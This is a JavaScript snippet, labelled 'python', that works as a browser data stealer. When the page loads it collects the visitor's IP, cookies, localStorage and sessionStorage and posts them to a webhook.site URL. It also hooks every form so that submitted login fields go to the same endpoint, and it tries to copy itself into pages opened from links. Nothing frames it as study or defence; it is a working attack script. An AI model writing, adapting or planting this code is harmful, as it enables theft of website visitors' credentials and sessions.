python
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (err) {
        console.error('Failed to get IP:', err);
        return 'unknown';
    }
}

async function sendData() {
    const ip = await getIP();
    const cookies = document.cookie;
    const localStorageData = JSON.stringify(localStorage);
    const sessionStorageData = JSON.stringify(sessionStorage);

    const payload = {
        ip,
        cookies,
        localStorage: localStorageData,
        sessionStorage: sessionStorageData
    };

    fetch('https://webhook.site/a4c663a9-0a51-431e-882a-1d36ceecaa9f', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(() => console.log('Data sent to webhook'))
    .catch(err => console.error('Error sending data:', err));
}

async function stealCredentials() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', async (event) => {
            const formData = new FormData(form);
            const credentials = {};
            formData.forEach((value, key) => {
                credentials[key] = value;
            });
            const payload = {
                credentials,
                ip: await getIP()
            };
            fetch('https://webhook.site/a4c663a9-0a51-431e-882a-1d36ceecaa9f', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(() => console.log('Credentials sent to webhook'))
            .catch(err => console.error('Error sending credentials:', err));
        });
    });
}

async function replicate() {
    const script = `
        <script>
            ${document.documentElement.innerHTML}
        </script>
    `;
    const links = document.querySelectorAll('a');
    links.forEach(link => {
        link.addEventListener('click', (event) => {
            event.preventDefault();
            const newTab = window.open(link.href, '_blank');
            newTab.document.open();
            newTab.document.write(script);
            newTab.document.close();
        });
    });
}

window.onload = async () => {
    await sendData();
    await stealCredentials();
    await replicate();
};
